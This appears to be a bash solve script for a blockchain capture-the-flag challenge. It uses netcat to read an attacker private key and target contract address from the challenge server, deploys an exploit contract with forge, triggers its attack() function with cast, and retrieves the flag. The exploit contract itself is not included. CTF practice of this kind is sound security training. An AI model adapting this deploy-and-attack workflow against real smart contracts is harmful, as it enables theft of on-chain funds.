#!/usr/bin/env bash

set -euo pipefail

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP> <PORT_NETCAT> <PORT_RPC>"
    exit 1
fi

IP="$1"
PORT_NETCAT="$2"
PORT_RPC="$3"

timeout 10 nc "$IP" "$PORT_NETCAT" >/dev/null || true

# Retrieve attacker private key and target contract address
ATTACKER_PRIV_KEY=$(echo "" | nc "$IP" "$PORT_NETCAT" | grep 'Private key' | awk -F 'Private key     :  ' '{print $2}')
echo "Attacker Private Key: $ATTACKER_PRIV_KEY"
TARGET_CONTRACT_ADDR=$(echo "" | nc "$IP" "$PORT_NETCAT" | grep 'Target contract' | awk -F 'Target contract :  ' '{print $2}')
echo "Target Contract Address: $TARGET_CONTRACT_ADDR"

ATTACKER_CONTRACT_ADDRESS="$(forge create exploit/Attacker.sol:Exploit --rpc-url "$IP":"$PORT_RPC" --private-key "$ATTACKER_PRIV_KEY" --broadcast --constructor-args "$TARGET_CONTRACT_ADDR" | grep -oE 'Deployed to: 0x[a-fA-F0-9]{40}' | awk '{print $3}')"
echo "Attacker Contract Address: $ATTACKER_CONTRACT_ADDRESS"

cast send --rpc-url "$IP":"$PORT_RPC" --private-key "$ATTACKER_PRIV_KEY" "$ATTACKER_CONTRACT_ADDRESS" "attack()" --gas-limit 700000000
echo "Attack transaction sent."

FLAG=$(echo "3" | nc "$IP" "$PORT_NETCAT" | grep 'Flag' | awk -F 'Flag: ' '{print $2}')
echo "Flag: $FLAG"
